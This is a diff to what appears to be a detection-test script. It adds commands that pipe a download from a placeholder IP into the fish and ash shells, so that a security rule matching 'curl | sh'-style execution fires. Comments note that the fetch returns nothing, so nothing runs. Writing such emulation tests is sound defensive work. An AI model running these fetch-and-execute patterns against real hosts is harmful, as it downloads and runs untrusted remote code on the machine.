@@ -26,5 +26,10 @@ rm -f /tmp/xmrig-emul 2>/dev/null || true
 # bash -c so the whole `curl ... | sh` is one process's argv (what the rule matches); the curl
 # returns nothing, so sh reads EOF immediately and runs nothing.
 timeout 3 bash -c 'curl -s --max-time 2 http://192.0.2.10/install.sh | sh' >/dev/null 2>&1 || true
+# Same shape into the shells the old '(ba|da|z|k)?sh' set missed: fish (Conor's login shell) and
+# ash (Alpine /bin/sh). The pipe target need not be installed - the `bash -c ... | fish` argv is
+# what the rule matches, and the empty curl output means nothing would run anyway.
+timeout 3 bash -c 'curl -s --max-time 2 http://192.0.2.10/install.sh | fish' >/dev/null 2>&1 || true
+timeout 3 bash -c 'wget -qO- --timeout=2 http://192.0.2.10/install.sh | ash' >/dev/null 2>&1 || true
 
 exit 0
